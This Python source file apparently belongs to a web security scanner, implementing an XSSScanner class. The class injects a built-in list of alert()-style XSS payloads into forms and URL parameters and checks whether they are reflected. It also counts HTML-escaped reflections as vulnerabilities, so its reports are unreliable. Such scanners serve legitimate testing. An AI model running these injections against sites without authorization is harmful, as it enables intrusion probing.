import requests
from bs4 import BeautifulSoup
from urllib.parse import urljoin, urlparse, parse_qs
import re

class XSSScanner:
    def __init__(self, session, timeout):
        self.session = session
        self.timeout = timeout
        self.payloads = self._load_payloads()
    
    def _load_payloads(self):
        """Load XSS payloads from file"""
        try:
            with open('data/xss_payloads.txt', 'r') as f:
                return [line.strip() for line in f if line.strip()]
        except FileNotFoundError:
            # Return basic XSS payloads if file doesn't exist
            return [
                '<script>alert("XSS")</script>',
                '"><script>alert("XSS")</script>',
                "'><script>alert('XSS')</script>",
                '<img src=x onerror=alert("XSS")>',
                '<svg onload=alert("XSS")>',
                'javascript:alert("XSS")',
                '<iframe src=javascript:alert("XSS")>',
                '<body onload=alert("XSS")>',
                '<input onfocus=alert("XSS") autofocus>',
                '<select onfocus=alert("XSS") autofocus>',
                '<textarea onfocus=alert("XSS") autofocus>',
                '<keygen onfocus=alert("XSS") autofocus>',
                '<video><source onerror=alert("XSS")>',
                '<audio src=x onerror=alert("XSS")>',
                '<details open ontoggle=alert("XSS")>',
                '<marquee onstart=alert("XSS")>',
                '"><img src=x onerror=alert("XSS")>',
                "'><img src=x onerror=alert('XSS')>",
                '<script>alert(String.fromCharCode(88,83,83))</script>',
                '<script>alert(/XSS/)</script>'
            ]
    
    def scan(self, target_url):
        """Scan for XSS vulnerabilities"""
        findings = []
        
        # Get the main page to find forms and parameters
        try:
            response = self.session.get(target_url, timeout=self.timeout)
            soup = BeautifulSoup(response.text, 'html.parser')
            
            # Test forms for XSS
            forms = soup.find_all('form')
            for form in forms:
                form_findings = self._test_form_xss(target_url, form)
                findings.extend(form_findings)
            
            # Test URL parameters for XSS
            url_findings = self._test_url_parameters(target_url)
            findings.extend(url_findings)
            
            # Test for reflected XSS in current page
            reflected_findings = self._test_reflected_xss(target_url)
            findings.extend(reflected_findings)
            
        except requests.exceptions.RequestException as e:
            findings.append({
                'title': 'XSS Scan Failed',
                'description': f'Unable to perform XSS scan: {str(e)}',
                'severity': 'info',
                'details': str(e)
            })
        
        return findings
    
    def _test_form_xss(self, target_url, form):
        """Test form inputs for XSS vulnerabilities"""
        findings = []
        
        try:
            # Get form details
            form_action = form.get('action', '')
            form_method = form.get('method', 'GET').upper()
            
            # Build form URL
            if form_action:
                form_url = urljoin(target_url, form_action)
            else:
                form_url = target_url
            
            # Get form inputs
            inputs = form.find_all(['input', 'textarea', 'select'])
            form_data = {}
            
            for input_elem in inputs:
                input_type = input_elem.get('type', 'text')
                input_name = input_elem.get('name', '')
                
                if input_name and input_type not in ['submit', 'button', 'reset']:
                    # Test each payload
                    for payload in self.payloads[:5]:  # Limit to first 5 payloads
                        test_data = form_data.copy()
                        test_data[input_name] = payload
                        
                        # Submit form
                        if form_method == 'POST':
                            response = self.session.post(form_url, data=test_data, timeout=self.timeout)
                        else:
                            response = self.session.get(form_url, params=test_data, timeout=self.timeout)
                        
                        # Check if payload is reflected
                        if self._is_payload_reflected(response.text, payload):
                            findings.append({
                                'title': f'XSS Vulnerability in Form Field: {input_name}',
                                'description': f'Form field {input_name} is vulnerable to XSS attacks',
                                'severity': 'high',
                                'details': f'Payload: {payload}, Form URL: {form_url}'
                            })
                            break  # Found vulnerability, move to next input
        
        except requests.exceptions.RequestException:
            pass
        
        return findings
    
    def _test_url_parameters(self, target_url):
        """Test URL parameters for XSS vulnerabilities"""
        findings = []
        
        try:
            # Parse URL for existing parameters
            parsed_url = urlparse(target_url)
            params = parse_qs(parsed_url.query)
            
            if not params:
                # Try common parameter names
                common_params = ['q', 'search', 'query', 'id', 'page', 'category', 'name', 'value']
                for param in common_params:
                    param_findings = self._test_parameter_xss(target_url, param)
                    findings.extend(param_findings)
            else:
                # Test existing parameters
                for param in params:
                    param_findings = self._test_parameter_xss(target_url, param)
                    findings.extend(param_findings)
        
        except Exception:
            pass
        
        return findings
    
    def _test_parameter_xss(self, target_url, param_name):
        """Test a specific parameter for XSS"""
        findings = []
        
        try:
            # Test with limited payloads
            for payload in self.payloads[:3]:  # Test first 3 payloads
                test_params = {param_name: payload}
                response = self.session.get(target_url, params=test_params, timeout=self.timeout)
                
                if self._is_payload_reflected(response.text, payload):
                    findings.append({
                        'title': f'XSS Vulnerability in URL Parameter: {param_name}',
                        'description': f'URL parameter {param_name} is vulnerable to XSS attacks',
                        'severity': 'high',
                        'details': f'Payload: {payload}, Parameter: {param_name}'
                    })
                    break  # Found vulnerability, no need to test more payloads
        
        except requests.exceptions.RequestException:
            pass
        
        return findings
    
    def _test_reflected_xss(self, target_url):
        """Test for reflected XSS in the current page"""
        findings = []
        
        try:
            # Simple reflected XSS test
            test_payload = '<script>alert("XSS-Test")</script>'
            test_params = {'test': test_payload}
            
            response = self.session.get(target_url, params=test_params, timeout=self.timeout)
            
            if self._is_payload_reflected(response.text, test_payload):
                findings.append({
                    'title': 'Reflected XSS Vulnerability',
                    'description': 'The page reflects user input without proper sanitization',
                    'severity': 'high',
                    'details': f'Payload reflected: {test_payload}'
                })
        
        except requests.exceptions.RequestException:
            pass
        
        return findings
    
    def _is_payload_reflected(self, response_text, payload):
        """Check if XSS payload is reflected in the response"""
        # Simple check for exact payload reflection
        if payload in response_text:
            return True
        
        # Check for HTML-encoded payload
        import html
        encoded_payload = html.escape(payload)
        if encoded_payload in response_text:
            return True
        
        # Check for URL-encoded payload
        import urllib.parse
        url_encoded_payload = urllib.parse.quote(payload)
        if url_encoded_payload in response_text:
            return True
        
        # Check for JavaScript execution indicators
        js_indicators = [
            'alert("XSS")',
            "alert('XSS')",
            'alert(/XSS/)',
            'String.fromCharCode(88,83,83)'
        ]
        
        for indicator in js_indicators:
            if indicator in response_text:
                return True
        
        return False
